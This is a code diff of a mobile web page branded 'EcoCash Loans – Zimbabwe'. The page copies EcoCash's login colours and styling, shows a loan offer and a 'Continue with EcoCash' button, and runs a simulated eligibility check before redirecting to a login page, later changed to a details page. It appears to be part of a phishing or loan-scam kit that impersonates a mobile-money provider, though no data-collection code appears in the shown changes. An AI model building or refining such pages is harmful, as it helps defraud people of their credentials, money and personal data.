@@ -2,10 +2,10 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
     <title>EcoCash Loans – Zimbabwe</title>
 
-    <!-- Favicon (placeholder – replace with actual icons) -->
+    <!-- Favicon (placeholder) -->
     <link rel="apple-touch-icon" sizes="192x192" href="#">
     <link rel="icon" type="image/png" sizes="512x512" href="#">
 
@@ -21,11 +21,11 @@
         }
 
         :root {
-            --primary-blue: #1c6aa6;      /* EcoCash login blue */
-            --primary-red: #e12b2b;        /* EcoCash login red */
-            --blue-dark: #125c9c;           /* darker shade from login bottom */
+            --primary-blue: #1c6aa6;      /* EcoCash blue */
+            --primary-red: #e12b2b;        /* EcoCash red */
+            --blue-dark: #125c9c;
             --blue-light: #4a8bc4;
-            --background: #f2f2f2;          /* light grey like login body */
+            --background: #f2f2f2;
             --card-bg: #ffffff;
             --text: #1a1a1a;
             --text-light: #666666;
@@ -46,7 +46,7 @@
 
         .container {
             width: 100%;
-            max-width: 480px;               /* same as Tala example */
+            max-width: 480px;
             margin: 0 auto;
             padding: 0 16px;
             flex: 1;
@@ -90,84 +90,43 @@
             font-weight: 600;
             margin-top: 8px;
             padding: 8px 20px;
-            background: rgba(28, 106, 166, 0.06); /* very light blue */
+            background: rgba(28, 106, 166, 0.06);
             border-radius: 40px;
             display: inline-flex;
             align-items: center;
             gap: 6px;
         }
 
-        .tagline img.flag-small {
+        .flag-small {
             width: 22px;
             height: auto;
             border-radius: 3px;
             box-shadow: 0 2px 4px rgba(0,0,0,0.1);
         }
 
-        /* ---------- LOADING OVERLAY (same mechanic) ---------- */
+        /* ========== SIMPLE BLUE LOADING OVERLAY (matching other pages) ========== */
         .loading-overlay {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+            inset: 0;
             background: rgba(0, 0, 0, 0.6);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-            padding: 16px;
             backdrop-filter: blur(3px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
         }
 
-        .loading-popup {
-            background: var(--card-bg);
-            border-radius: var(--border-radius);
-            padding: 32px 24px;
-            box-shadow: var(--shadow-hover);
-            text-align: center;
-            max-width: 280px;
-            width: 100%;
-            border: 1px solid rgba(28, 106, 166, 0.1);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .loading-popup::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 4px;
-            background: linear-gradient(90deg, var(--primary-blue) 0%, var(--primary-red) 100%);
-        }
-
-        .loading-spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid rgba(28, 106, 166, 0.1);
+        .simple-spinner {
+            width: 48px;
+            height: 48px;
+            border: 5px solid #ffffff;
+            border-top: 5px solid var(--primary-blue);  /* blue accent instead of red */
             border-radius: 50%;
-            border-top: 4px solid var(--primary-blue);
             animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
         }
 
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .loading-text {
-            font-size: 0.95rem;
-            color: var(--text);
-            margin-bottom: 8px;
-            font-weight: 600;
-        }
-
-        .loading-subtext {
-            font-size: 0.8rem;
-            color: var(--text-light);
+            to { transform: rotate(360deg); }
         }
 
         /* ---------- MAIN CARD ---------- */
@@ -189,7 +148,7 @@
             box-shadow: var(--shadow-hover);
         }
 
-        /* Zimbabwe flag stripe: black, red, yellow, green */
+        /* Zimbabwe flag stripe (black, red, yellow, green) */
         .main-card::before {
             content: '';
             position: absolute;
@@ -198,11 +157,11 @@
             right: 0;
             height: 5px;
             background: linear-gradient(90deg, 
-                #000000 0%,      /* black */
-                #d12e2e 25%,     /* red (approx) */
-                #fcd116 50%,     /* yellow */
-                #1eb53a 75%,     /* green */
-                var(--primary-blue) 100% /* blue as an extra accent */
+                #000000 0%,
+                #d12e2e 25%,
+                #fcd116 50%,
+                #1eb53a 75%,
+                var(--primary-blue) 100%
             );
             border-radius: var(--border-radius) var(--border-radius) 0 0;
         }
@@ -274,7 +233,7 @@
             display: block;
         }
 
-        /* ---------- CTA BUTTON (blue gradient like login theme) ---------- */
+        /* ---------- CTA BUTTON (blue gradient) ---------- */
         .cta-section {
             margin: 32px 0;
             position: relative;
@@ -432,7 +391,7 @@
             text-decoration: underline;
         }
 
-        /* minor responsive adjustments */
+        /* responsive adjustments */
         @media (max-width: 360px) {
             .loan-amount {
                 font-size: 2rem;
@@ -447,7 +406,7 @@
 <body>
 <div class="container">
 
-    <!-- HEADER with Zimbabwe flag and EcoCash logo (blue/red) -->
+    <!-- HEADER with Zimbabwe flag and EcoCash logo -->
     <header class="header">
         <div class="logo">
             <div class="logo-text">
@@ -460,13 +419,9 @@
         </p>
     </header>
 
-    <!-- LOADING OVERLAY (same as login page style) -->
+    <!-- SIMPLE BLUE LOADING OVERLAY (no card, just spinner) -->
     <div class="loading-overlay" id="loadingOverlay">
-        <div class="loading-popup">
-            <div class="loading-spinner"></div>
-            <p class="loading-text">Processing your request</p>
-            <p class="loading-subtext">Checking eligibility ...</p>
-        </div>
+        <div class="simple-spinner"></div>
     </div>
 
     <!-- MAIN CARD – loan offer -->
@@ -495,11 +450,11 @@
         </div>
     </div>
 
-    <!-- CTA BUTTON (blue/red gradient) -->
+    <!-- CTA BUTTON -->
     <div class="cta-section">
         <button class="btn-apply" id="applyButton">
             <span class="btn-content">
-                Continue with EcoCash<i class="fas fa-arrow-right"></i>
+                Continue with EcoCash <i class="fas fa-arrow-right"></i>
             </span>
         </button>
     </div>
@@ -547,16 +502,15 @@
                 e.preventDefault();
                 overlay.style.display = 'flex';
 
-                // simulate loading then redirect (to be replaced with actual flow)
+                // simulate loading, then redirect
                 setTimeout(() => {
                     overlay.style.display = 'none';
-                    
-                    window.location.href = 'login.html';
+                    window.location.href = 'details.html';
                 }, 2000);
             });
         }
 
-        // touch feedback for features/badges
+        // small touch feedback for interactive elements
         document.querySelectorAll('.feature, .trust-badge').forEach(el => {
             el.addEventListener('touchstart', function() {
                 this.style.transform = 'translateY(-2px)';
@@ -566,7 +520,7 @@
             });
         });
 
-        // ensure overlay hidden on page load / back navigation
+        // ensure overlay is hidden on page load / back navigation
         window.addEventListener('load', function() {
             overlay.style.display = 'none';
         });
@@ -575,6 +529,5 @@
         });
     })();
 </script>
-
 </body>
 </html>
